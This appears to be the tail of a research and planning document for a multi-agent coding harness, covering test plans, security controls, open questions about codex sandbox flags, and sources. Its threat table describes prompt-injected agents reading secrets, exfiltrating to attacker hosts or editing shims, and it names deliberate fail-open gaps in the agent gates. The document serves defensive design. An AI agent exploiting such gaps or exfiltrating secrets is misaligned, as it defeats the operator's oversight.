| **RECORD-01** | The record survives a close/reopen with its **target** | unit | `node --test test/record-persist.test.cjs` | Insert → `close()` (WAL checkpoint) → new `PersistStore` → row present **with `target` non-null** | Asserting only row count passes against a null target — the half the requirement exists for | ❌ **Wave 0** |
| **RECORD-01** | The writer fires from a real hook payload | integration | same file | Drive a `PreToolUse` payload through the real `HookServer`, then read `tool_calls` | Calling the writer directly never proves it is wired into `handle` | ❌ Wave 0 |
| **RECORD-02** | A day past 16 MiB reads back whole | unit | `node --test test/record-retention.test.cjs` | Insert ≥ 40 k events spanning one day, assert a `WHERE ts BETWEEN ?` range scan returns **all** of them, including the first | Asserting a tail returns rows is what the 8 MiB rotate already does | ❌ **Wave 0** |
| **RECORD-02** | Retention deletes only past the bound | unit | same file | Rows older than N days gone, rows inside N days all present | — | ❌ Wave 0 |
| **RECORD-05** | Restore one file, neighbours byte-identical | integration | `node --test test/restore-points.test.cjs` | Exactly D-22: snapshot → change 3 files → restore 1 → assert the other 2 byte-identical **and** operator `git status --porcelain` + `git rev-parse HEAD` + branch list unchanged across the whole sequence | Asserting only the restored file passes while the other two were clobbered | ❌ **Wave 0** |
| **RECORD-05** | A gitignored directory never enters a snapshot | integration | same file | Fixture repo with `build/` ignored and a fat file inside; `ls-files` in the store shows **0** matches | — | ❌ Wave 0 |
| **RECORD-05** | An uncommitted nested repo does not kill the snapshot | integration | same file | `git init` a subdir with no commit, run the snapshot, assert **exit 0** and a non-empty `ls-files` (L-06) | Without this, the first agent worktree silently ends all restore points | ❌ **Wave 0 — the highest-value new test in the phase** |
| **VIGIL-01** | Silence past the threshold alarms **once** | unit | `node --test test/absence-watchdog.test.cjs` | Injected clock + fake reads: 1 alarm on the transition; 0 on the next 5 ticks; 1 more after activity then silence again | Asserting "an alarm fired" without the second tick misses a per-tick spam bug | ❌ **Wave 0** |
| **VIGIL-01** | It fires when the **god** is the dead one | unit | same file | Roster where the god's PTY is gone and every worker is quiet → alarm still fires, addressed to the operator, **not** `to:'god'` | A watchdog that mails god passes a naive test and fails the requirement's named case | ❌ Wave 0 |
| **VIGIL-01** | The alarm carries what was in flight | unit | same file | Payload names the `doing` cards and their assignees captured **at the transition** | — | ❌ Wave 0 |
| **VIGIL-01** | The timer is torn down | unit | `node --test test/boot-floor.test.cjs` (extend) | After `floor.shutdown()`, the interval is cleared (assert via the same shape `fleetTimer` uses) | A leaked interval keeps the test process alive — visible as a hung `node --test` | ✅ extend |
| **VIGIL-02** | The card is released in the teardown tick | unit | `node --test test/agent-lifecycle.test.cjs` (extend) | Call `teardownPty` with a fake deps set; assert a ledger mutation naming the dropping agent **synchronously** (D-27) | Asserting "eventually" hides that the primary path is a sweep | ✅ extend |
| **VIGIL-02** | It names where the branch is | unit | same | The follow-up patch carries `worktreeHasUnintegratedWork`'s `branch`/`detail` (L-09) | — | ✅ extend |
| **VIGIL-03** | A blocked agent is not idled by quiesce | unit | `node --test test/delivery-main.test.cjs` (extend) | `liveAgents()` returns `{blocked:true, hasOutput:true, lastOutputAt: now-30_000}`; assert `setStatus` was **never called** and the synthesized Stop was **not** emitted | **This is the test that would fail today**; if it passes before the fix, the fixture is wrong | ✅ extend |
| **VIGIL-03** | A blocked agent is not mailed more work | unit | same | Same fixture with unread inbox mail; assert `write` was never called with `WAKE_NUDGE` | Half the clause; without it the guard is cosmetic | ✅ extend |
| **VIGIL-03** | Detection works with no renderer | unit | `node --test test/block-detect.test.cjs` | Feed a `BLOCK_HINTS`-matching chunk through the main-side tap with **no** webContents; assert `blocked` flips | A renderer-dependent test cannot distinguish headless from broken | ❌ **Wave 0** |
| **VIGIL-04** | Every mutation stamps `updatedAt` | unit | `node --test test/hive-task-mutation.test.cjs` (extend) | `add`, `patch`, `claim`, `done` **each** produce an ISO `updatedAt` ≥ `createdAt`; and the main-side ledger writer does too | Testing one verb leaves the other three unstamped — "nine hours in doing" from the wrong clock | ✅ extend |
| **VIGIL-04** | Age renders on cards and unanswered asks | unit | `node --test test/renderer-components.test.cjs` (extend) | Render `TasksKanban` with `updatedAt` 9 h ago and `askedAt` 4 min ago; assert both strings appear | — | ✅ extend |
| **all** | No requirement is closed on a green test alone | repo-fact | `node --test test/repo-claims.test.cjs` | `MARKER_LEDGER` still matches reality; new `LIVE-UNVERIFIED` markers added in the same commit | Ledger drift = an unmarked unverified bridge (S-8) | ✅ **must be edited by any marker-adding plan** |

### Sampling rate

- **Per task commit:** the one or two test files that plan owns — `node --test test/<file>.test.cjs`, 0.5–4 s.
- **Per wave merge:** `npm test` (full, 24 s) **plus** `npm run typecheck` **plus** `npm run lint`. Full suite because this phase edits `hooks.ts`, `delivery.ts` and `pty.ts` — three files with the widest blast radius in the repo.
- **Phase gate:** full suite green on **all three CI platforms** (`ci.yml:62`, no `continue-on-error`) before `/gsd:verify-work`. Plus the three items no suite can reach — see below.
- **Skipped-count invariant:** the baseline is **7** skipped. Any new POSIX-only test raises it; that number should be asserted or at least stated in the SUMMARY, because a silently-growing skip count is how a platform stops being tested.

### Signals that no automated test can produce (operator-owned, MEASUREMENT UNAVAILABLE until run)

1. **GATE-04's live codex run** — a real codex agent with `-s workspace-write --add-dir` finishing a task, mailing, and writing `memory.md` **with no write refused**. Blocked upstream by openai/codex#23552 on Windows; codex 0.128.0 is installed and authenticated here, so this **is** runnable.
2. **GATE-02's live non-Claude agent** — D-13's explicit condition: one live non-Claude agent still authenticates and completes a task after the env allowlist lands. Codex is the only candidate on this machine.
3. **GATE-05 on a physical phone** — Deferred list already records this as a first-class outcome, not a failure.
4. **GATE-03 on grok / pi / OpenCode** — not installable here. `LIVE-UNVERIFIED`, marker ledger updated.

### Wave 0 gaps

- [ ] `test/pty-env-allowlist.test.cjs` — GATE-02, both directions
- [ ] `test/command-shape.test.cjs` — GATE-03, four shapes + negatives + empty-allowlist-fails-closed
- [ ] `test/gate03-roundtrip.test.cjs` — GATE-03, real shim → real server (POSIX-only)
- [ ] `test/gate05-bounded-wait.test.cjs` — GATE-05, deadline-denies / yes-allows / dead-socket-allows (POSIX-only)
- [ ] `test/record-persist.test.cjs` — RECORD-01, survives close/reopen **with target**
- [ ] `test/record-retention.test.cjs` — RECORD-02, day range scan + bounded delete
- [ ] `test/restore-points.test.cjs` — RECORD-05, D-22's sequence + gitignore + **nested-repo survival**
- [ ] `test/absence-watchdog.test.cjs` — VIGIL-01, once-only + god-death + in-flight payload
- [ ] `test/block-detect.test.cjs` — VIGIL-03, detection with no renderer
- [ ] No framework install needed; no `conftest`-equivalent needed. Every new file follows `test/boot-floor.test.cjs`'s per-test isolated `(userData, harnessHome)` pattern (`:71-85`).

---

## Security Domain

`security_enforcement` is not set to `false` in `.planning/config.json`, so this section applies. This phase **is** the security phase of the milestone.

### Applicable ASVS categories

| ASVS category | Applies | Standard control, as it exists here |
|---|---|---|
| V1 Architecture | **yes** | The gate lives in main; the shim only relays (`hooks.ts:629-631`). Written ceilings are a deliverable (D-34, `hooks.ts:800-859`). |
| V2 Authentication | **yes** | Per-agent hook tokens minted per spawn (`pty.ts:739`), server-derived identity (`hooks.ts:626`) — GATE-01, already landed. Phone bearer auth is Phase 2's (`webhook.ts`). |
| V3 Session Management | **yes** | Ask ids must be unguessable (`randomBytes`) and single-use; an expired ask must not be answerable. |
| V4 Access Control | **yes** | GATE-03/GATE-05 **are** V4 — deny-by-default on the host allowlist (D-05), operator-explicit yes for the third answer. |
| V5 Input Validation | **yes** | Tokenized judging over `expandHiveVars` output; `new URL()` for host normalization; `HOOK_LINE_MAX` (16 MiB, `hooks.ts:435`) and `HOOK_CANDIDATE_MAX` (500, `:341`) already bound the payload. |
| V6 Cryptography | **yes** — never hand-roll | `node:crypto` only. `push.ts` already does VAPID this way. |
| V7 Error Handling / Logging | **yes** | RECORD-01/02 **are** V7. `hive.ts:2517-2522` already forbids persisting raw OTel records (PII); the new `tool_calls.target` carries a **command string an agent wrote**, so it must be treated as untrusted text on read-back. |
| V8 Data Protection | **yes** | GATE-02 is V8 at the process boundary. `harness.db` is in `userData` alongside config; the restore store contains the operator's source. |
| V12 Files & Resources | **yes** | RECORD-05 writes under the hive root only and reads the operator's tree; `safeJoin` (`git.ts:3`) is the house helper. |
| V13 API | partial | `POST /phone/api/answer`'s body cap and rate bucket are Phase 2's and are reused unchanged. |
| V14 Configuration | **yes** | The host allowlist and the env pass-through list are both new operator-editable security config. Both must fail safe when malformed. |

### Known threat patterns for this stack

| Pattern | STRIDE | Standard mitigation, and where |
|---|---|---|
| Prompt-injected agent reads a credential out of its own env | Information disclosure | GATE-02's allowlist at `pty.ts:751`; ceiling item (a) names what it does not reach |
| Agent runs an unrecoverable command | Tampering / DoS | GATE-03's tokenized judge; GATE-05's third answer |
| Agent exfiltrates to an attacker host | Information disclosure | D-05's deny-by-default host allowlist, **failing closed when empty** |
| Agent edits a shim or a hook seed to smuggle a key | Elevation of privilege | `protectedPathDenial`'s `(dev,ino)` identity (`hooks.ts:860`); `gitCommitter.harnessAuthored` byte-identity scrub (`:238-248`). **The user-global seed hole is inherited and Deferred (D-07 hole 1) — it must be restated in the SUMMARY, not silently carried.** |
| Approval-prompt fatigue / bypass | Repudiation | Ask TTL times out to **deny**; every verdict is written to `tool_calls.decision` — which is what makes GATE-05 auditable rather than merely interactive |
| A second process races the restore store | Tampering | Single-writer + stale-lock recovery (L-07) |
| An answered-late approval races its own timeout | Race / Repudiation | Server-side TTL must be ≤ the deadline handed to the shim (Pattern 3) |
| Log injection through `tool_calls.target` | Tampering | It is agent-authored text; escape at render, never `eval`, and never interpolate into SQL (bound parameters only, as `db.ts` already does throughout) |

**Three deliberate, recorded fail-opens this phase inherits and must restate rather than fix** (D-07, `hooks.ts:54-62`): the user-global engine seeds; the shim's connect-error exit-0; and `protectedPathDenial`'s `if (!root) return null` (ceiling item (i), disposition ACCEPT, owner "hive maintainer"). **This phase adds exactly one new deliberate fail-open** — pi and OpenCode receive the ask reply's deny and cannot poll, so "ask" degrades to "deny" for them. That is the safe side, and it is still a behaviour that must appear in a ceiling list.

---

## Assumptions Log

| # | Claim | Section | Risk if wrong |
|---|---|---|---|
| A1 | The suggested default host allowlist membership (`registry.npmjs.org`, `api.anthropic.com`, …) | Pattern 2 | Too narrow → the floor's own agents are denied at 3 a.m., the exact D-15 failure mode. Too broad → the gate buys less than it claims. **Mitigation: fail closed, ship a default, and let the first denial teach the operator.** |
| A2 | Ask TTL of 120 s | Pattern 3 | Too short → a phone push cannot be answered in time and every ask denies. Too long → a wedged worker. No measurement supports this number. |
| A3 | 30-day event retention | Pattern 5 | Too short → SCALE-03's replay loses days Phase 3 wanted. Too long → an unbounded table. Reversible either way (it is a `DELETE … WHERE ts < ?`). |
| A4 | ~288 k `tool_calls` rows/day as a pessimistic ceiling | Pattern 4 | If real volume is 10× that, the un-batched insert may need `db.transaction()`. Cheap to measure once the writer exists; the upgrade path is named. |
| A5 | Claude Code's OTel `tool_result` event carries no file-path attribute upstream | Pattern 4 / L-05 | If it *does* and `ATTR_ALLOWLIST` is merely not admitting it, the telemetry path becomes viable for Claude — but it would still be Claude-only (`hive.ts:1122`), so the conclusion is unchanged. **Verified locally that the allowlist excludes it; not verified against Claude Code's emitted schema.** |
| A6 | pi's `tool_call` handler honours an **async** return value | §Cross-Engine Reality | If pi only consumes a synchronous return, GATE-03 for pi cannot wait and degrades to an immediate deny. Cannot be settled without a pi install + key. |
| A7 | OpenCode's `tool.execute.before` can veto | §Cross-Engine Reality | D-06 already rules this `LIVE-UNVERIFIED`; assumed here only to justify building the path. |
| A8 | openai/codex#23552 reproduces on 0.128.0 (this machine's version) | L-11 | The issue is filed against 0.130.0-alpha.5. If it does **not** reproduce here, GATE-04 is easier than feared; if it does, `--add-dir` is the alternative to try. **Wave-0 spike, not an assumption to carry into a plan.** |

---

## Open Questions

1. **Does `codex --add-dir` actually make a non-cwd path tree writable under `-s workspace-write` on Windows 0.128.0?**
   - *What we know:* the flag exists and is documented in `codex --help` as "Additional directories that should be writable alongside the primary workspace"; `codex sandbox windows` (a Windows restricted-token sandbox) exists; codex is installed and authenticated here.
   - *What is unclear:* whether `--add-dir` shares issue #23552's defect. `codex sandbox windows` could not be used as a cheap probe because on 0.128.0 it requires `--permissions-profile <NAME>` and then `Error: default_permissions requires a '[permissions]' table` — a newer permissions model whose TOML shape is not in the public docs I fetched.
   - *Recommendation:* **a Wave-0 spike, 15 minutes.** Spawn one real codex agent with `-s workspace-write --add-dir <agentDir>` and have it write `memory.md`. That single run decides whether GATE-04 ships codex or the planner exercises D-15's substitution licence. There is no engine to substitute *to* on this machine, so if it fails the honest outcome is "GATE-04 built, LIVE-UNVERIFIED on Windows, upstream issue #23552 cited."

2. **What is codex 0.128.0's `[permissions]` table shape?**
   - *What we know:* `codex sandbox <macos|linux|windows>` requires `--permissions-profile <NAME>` and errors `default_permissions requires a '[permissions]' table`. The public config docs at learn.chatgpt.com describe only the older `sandbox_mode` + `[sandbox_workspace_write]` model.
   - *What is unclear:* the table's keys.
   - *Recommendation:* **do not chase it.** The floor spawns codex through the interactive/exec path, which takes `-s` and `--add-dir` as flags. Record it as an unexplored zero-cost test harness for a future phase.

3. **Should VIGIL-01 read `tool_calls` (RECORD-01) or the ledger `rev` + `appendLog`?**
   - *What we know:* both work; `hive.ts:2118-2123` bumps a ledger `rev` on every mutation, and `appendLog` sites are enumerable.
   - *Recommendation:* **`rev` + `appendLog`.** It dissolves S-3 and S-5, letting the VIGIL and RECORD tracks run fully independently under `use_worktrees: false`.

4. **Does the operator's project repo == `harnessHome`?**
   - *What we know:* the hive lives at `<harnessHome>/hive` (`hive.ts:518-521`); agent PTY `cwd` is `opts.cwd`, set per agent; `hooks.ts:809-812` describes cwd as "the user's project".
   - *What is unclear:* whether one floor can have agents in **several** project repos — in which case RECORD-05 needs one restore store per repo, keyed by repo path, not one per floor.
   - *Recommendation:* **settle this in planning before writing the schema.** `RegistryAgent.cwd` per agent (`hooks.ts:947-956`) strongly suggests multiple cwds are possible. A per-repo store keyed by a hash of the repo path is the safe shape and costs nothing extra.

5. **Does anything read `HiveTask` in a way that a new `updatedAt` field breaks?**
   - *What we know:* `bin/task.cjs` compare-and-swaps on a ledger `rev`; the kanban, webhooks and Slack all write through `HiveManager`.
   - *What is unclear:* whether any consumer does exact-shape validation.
   - *Recommendation:* grep for `JSON.parse` + shape checks over `tasks.json` in `TASK_CLI` before adding the field. Additive optional fields are normally free here (`HiveTask` already has seven optional ones).

---

## Sources

### Primary — HIGH confidence (read or executed in this session)

**Source files opened at `ad3d2f7`:** `src/main/hooks.ts` (1536 L), `src/main/control.ts` (118), `src/main/hiveTemplates.ts` (797), `src/main/hiveProvisioning.ts` (569), `src/main/pty.ts` (962), `src/main/telemetry.ts` (723), `src/main/db.ts` (320), `src/main/hive.ts` (2821), `src/main/gitCommitter.ts` (511), `src/main/delivery.ts` (1005), `src/main/webhook.ts` (1066), `src/main/index.ts` (4980), `src/main/config.ts` (1134), `src/main/git.ts` (554), `src/main/reflect.ts` (578), `src/main/shellEnv.ts` (112), `src/main/procKill.ts` (54), `src/main/floor/boot.ts` (1220), `src/main/floor/lifecycle.ts` (254), `src/main/floor/deps.ts` (114), `src/main/floor/headless.ts` (66), `src/shared/agentProvider.ts` (738), `src/renderer/src/hooks/useHive.ts` (1214), `src/renderer/src/hooks/usePtyParser.ts` (223), `src/renderer/src/components/terminalPool.ts` (794), `src/renderer/src/components/TasksKanban.tsx` (472), `src/renderer/src/store/config.ts`.

**Test files opened:** `test/load-ts.cjs`, `test/boot-floor.test.cjs`, `test/hook-auth-roundtrip.test.cjs`, `test/repo-claims.test.cjs`, `test/control.test.cjs`, `test/engine-parity.test.cjs`.

**Planning docs opened:** `.planning/REQUIREMENTS.md` (GATE 167-199, RECORD 200-223, VIGIL 224-241), `.planning/ROADMAP.md` (Phase 4, 385-428), `.planning/STATE.md`, `.planning/PROJECT.md`, `.planning/config.json`, `.planning/phases/04-overnight-on-a-repo-that-matters/04-CONTEXT.md` (698 L, in full), `.github/workflows/ci.yml`.

**Commands executed in this session (all on the target machine):**
- `node --test test/*.test.cjs` → 805/798/0/7, 23.7 s
- `npx tsc --noEmit -p tsconfig.node.json` and `-p tsconfig.web.json` → 0 errors each
- `node --test test/repo-claims.test.cjs` → 31/31
- `grep -ro 'LIVE-UNVERIFIED' src/ | cut -d: -f1 | sort | uniq -c` → 18, matching `MARKER_LEDGER`
- `git --version` → 2.52.0.windows.1
- `bash gsd-record05-probe.sh` — the full RECORD-05 mechanism (§Pattern 6's table)
- `bash gsd-record05-probe2.sh` — nested repos, `info/exclude`, `gc`, pruning, `index.lock` contention
- `node gsd-gate02-probe.js` — 114 env vars, win32 minimum set, child survival on pruned envs
- `bash gsd-engines-probe.sh` — engine CLI inventory; `better-sqlite3` 13.0.3 / SQLite 3.53.4 loaded
- `codex --version` → codex-cli 0.128.0; `codex --help`; `codex sandbox --help`; `codex sandbox windows --help`; `codex exec --help`; `codex login status` → "Logged in using ChatGPT"
- `bash gsd-gate04-probe.sh`, `gsd-gate04-probe2.sh` — codex Windows sandbox probes (result: `--permissions-profile` required)
- `gh issue view 23552 --repo openai/codex` → OPEN, 2026-05-19

### Secondary — MEDIUM confidence

- [CITED: learn.chatgpt.com/docs/config-file/config-advanced] — codex `sandbox_mode` values, `[sandbox_workspace_write]` keys (`writable_roots`, `network_access`, `exclude_tmpdir_env_var`, `exclude_slash_tmp`), `approval_policy` values. Cross-checked against `codex --help` on the installed 0.128.0, which confirms `-s/--sandbox`, `--add-dir` and `-a/--ask-for-approval`.
- [VERIFIED: gh CLI] openai/codex issue #23552 — title, state OPEN, `createdAt` 2026-05-19T20:39:58Z, body quoting the reporter's `config.toml` including `[windows] sandbox = "elevated"`.

### Tertiary — LOW confidence, flagged

- WebSearch summaries of third-party codex-CLI blog posts (digitalapplied, inventivehq, ofox.ai). Used only to locate issue #23552 and the official docs URL; **no claim in this document rests on them.**
- The default host allowlist membership (A1) — training knowledge, unverified against any engine's docs in this session.

---

## Metadata

**Confidence breakdown:**

| Area | Level | Reason |
|---|---|---|
| Drift report | **HIGH** | 42 rows, every one re-grepped or re-read at `ad3d2f7` in this session |
| Source seams and call chains | **HIGH** | Every cited function opened; the `handle` → `conn.end` chain traced end to end |
| RECORD-05 git mechanism | **HIGH** | Executed end-to-end on the target OS with the target git version; three failure modes reproduced |
| GATE-02 env facts | **HIGH** on what is present and what survives; **MEDIUM** on the final allowlist membership | The win32 probe was run; the allowlist itself is a design choice with a named regression hazard (L-04) |
| GATE-03 mechanism | **HIGH** | The tokenizer, the early return (L-01) and the deny wire shape were all read |
| GATE-03 engine reach | **HIGH** on which bridges exist (source-enumerated); **HIGH** on which CLIs are installed (probed) | Both measured; the *veto* behaviour of pi/OpenCode remains MEDIUM-LOW and is already `LIVE-UNVERIFIED` by D-06 |
| GATE-04 | **MEDIUM** | `-s` and `--add-dir` confirmed on the installed binary; whether `--add-dir` clears issue #23552 on Windows is **the phase's one genuine unknown** and is a Wave-0 spike |
| GATE-05 design | **HIGH** on why streaming fails (the three shims' decoders were read line by line); **MEDIUM** on the poll protocol's exact shape | The failure mode is measured from source; the protocol is a design |
| RECORD-01 storage | **HIGH** | The three reasons telemetry cannot carry it are each a specific line |
| RECORD-02 | **HIGH** | `appendLog`, the rotate and the `userData` DB location all read |
| VIGIL-01 | **HIGH** | The boot seam, `SHUTDOWN_STEPS`, `idleFor` and `HEARTBEAT_MISSION` all read |
| VIGIL-02 | **HIGH** | `teardownPty` read in full; the async-branch-fact problem (L-09) is a direct consequence |
| VIGIL-03 | **HIGH** | `delivery.ts:713-753` and `:770-806` read in full; the unguarded `setStatus` is at `:740` |
| VIGIL-04 | **HIGH** | `HiveTask`, `HumanQA`, `TasksKanban.tsx:15/:100` all read |
| Test baseline | **HIGH** | Re-run in this session |

**Research date:** 2026-08-25
**Valid until:** ~2026-09-08 for the source seams (this repo moves fast — re-measure any file:line before quoting it, per the standing evidence rule). The codex-CLI findings age faster: 0.128.0 → 0.130.0-alpha is already out, so **re-run `codex --help` and re-check issue #23552 at execution start.**
</content>
</invoke>
